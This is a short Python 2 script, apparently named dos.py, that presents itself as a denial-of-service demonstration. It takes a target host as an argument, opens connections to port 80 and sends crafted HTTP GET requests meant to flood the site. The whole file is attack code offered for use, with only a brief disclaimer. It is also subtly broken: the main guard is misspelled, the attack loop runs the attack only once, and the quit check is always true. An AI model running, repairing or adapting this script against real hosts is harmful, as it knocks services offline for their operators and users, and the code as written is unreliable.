import socket,sys 
"""
This script demostrates Denial of service(DoS) attack.The script does not intent to target any webiste.
The scripts accepts one argument, which is the host to be passed.
run the script like python dos.py www.somedomain.com
"""
msg="+++++++++++++++++"
def start_dos():
	
	try:
		attack_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM) #socket definition
		attack_socket.connect((sys.argv[1],80)) #connect the socket to host across port 80
		#set the default timeout make it as minimum as possible inorder to keep flooding the site.
		socket.setdefaulttimeout(0.2)
		print "Host and port of attacking site", attack_socket.getpeername()		
 		attack_socket.send("GET /" + msg + " HTTP/1.1\r\n")
		attack_socket.send("Host: " + sys.argv[1]+ "\r\n\r\n"); 
# Catch the exception for general socket error  & timeout error 
#since the script aims at continous attack catch the exception of keyboard Interrupt.
	except socket.error, message: print "Socket not created" 
	except socket.timeout:
		attack_socket.close()
		main()
	except (KeyboardInterrupt):
		usr_input=raw_input("Enter q or Q to end the script")
		if usr_input =='q' or 'Q':
			sys.exit()
	attack_socket.close()
def main():
	#host=raw_input("Enter the host name") 
	#msg=raw_input("Enter a text to send across socket")
	print "DoS started"
	for i in range(1,10000):
		print "Attack No :",i
	start_dos()
if __name__=='__main':		
	main()
